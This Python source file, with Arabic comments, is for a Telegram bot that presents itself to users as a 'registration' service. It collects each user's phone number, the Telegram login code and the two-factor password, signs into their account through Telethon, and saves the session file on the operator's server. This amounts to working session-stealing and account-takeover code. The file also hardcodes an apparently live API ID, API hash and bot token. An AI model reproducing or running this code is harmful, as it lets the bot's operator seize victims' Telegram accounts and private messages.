import asyncio
import os
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# بيانات API من my.telegram.org
API_ID = 23656977
API_HASH = '49d3f43531a92b3f5bc403766313ca1e'
BOT_TOKEN = '8300609210:AAGHCu5Un2UDMEnxy4Oh-QCY1_kVDm3S6Ro'

# تخزين بيانات المستخدمين المؤقتة
user_sessions = {}

# إنشاء مجلد الجلسات إذا لم يكن موجوداً
if not os.path.exists('sessions'):
    os.makedirs('sessions')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("تسجيل", callback_data='register')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        'مرحباً! اضغط على زر "تسجيل" لبدء عملية تسجيل الدخول.',
        reply_markup=reply_markup
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'register':
        user_id = query.from_user.id
        user_sessions[user_id] = {'step': 'request_phone'}
        await query.edit_message_text('يرجى إرسال رقم هاتفك مع رمز الدولة (مثال: +1234567890)')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    text = update.message.text
    
    if user_id not in user_sessions:
        # إذا لم يكن المستخدم في عملية تسجيل، نعرض زر التسجيل
        keyboard = [
            [InlineKeyboardButton("تسجيل", callback_data='register')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            'مرحباً! اضغط على زر "تسجيل" لبدء عملية تسجيل الدخول.',
            reply_markup=reply_markup
        )
        return
    
    if user_sessions[user_id]['step'] == 'request_phone':
        # طلب رقم الهاتف
        phone = text
        user_sessions[user_id]['phone'] = phone
        user_sessions[user_id]['step'] = 'request_code'
        
        # إنشاء عميل Telethon
        client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
        await client.connect()
        
        # إرسال رمز التحقق
        try:
            sent_code = await client.send_code_request(phone)
            user_sessions[user_id]['client'] = client
            user_sessions[user_id]['phone_code_hash'] = sent_code.phone_code_hash
            
            await update.message.reply_text('تم إرسال رمز التحقق إلى هاتفك. يرجى إدخاله:')
        except Exception as e:
            await update.message.reply_text(f'حدث خطأ: {str(e)}')
            del user_sessions[user_id]
    
    elif user_sessions[user_id]['step'] == 'request_code':
        # معالجة رمز التحقق
        code = text.strip()
        client = user_sessions[user_id]['client']
        phone_code_hash = user_sessions[user_id]['phone_code_hash']
        phone = user_sessions[user_id]['phone']
        
        try:
            # محاولة تسجيل الدخول
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            # نجاح التسجيل
            await update.message.reply_text('تم تسجيل الدخول بنجاح!')
            await client.disconnect()
            
            # مسح بيانات الجلسة المؤقتة
            del user_sessions[user_id]
            
        except SessionPasswordNeededError:
            # إذا كانت هناك حاجة إلى كلمة مرور ثنائية
            user_sessions[user_id]['step'] = 'request_2fa'
            await update.message.reply_text('يرجى إدخال كلمة المرور الثنائية:')
        
        except Exception as e:
            await update.message.reply_text(f'حدث خطأ أثناء التحقق: {str(e)}')
            await client.disconnect()
            del user_sessions[user_id]
    
    elif user_sessions[user_id]['step'] == 'request_2fa':
        # معالجة كلمة المرور الثنائية
        password = text
        client = user_sessions[user_id]['client']
        
        try:
            await client.sign_in(password=password)
            await update.message.reply_text('تم تسجيل الدخول بنجاح!')
            await client.disconnect()
            del user_sessions[user_id]
        except Exception as e:
            await update.message.reply_text(f'حدث خطأ في كلمة المرور: {str(e)}')
            await client.disconnect()
            del user_sessions[user_id]

def main():
    # إنشاء تطبيق البوت
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة معالجات الأوامر
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # بدء البوت
    print("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
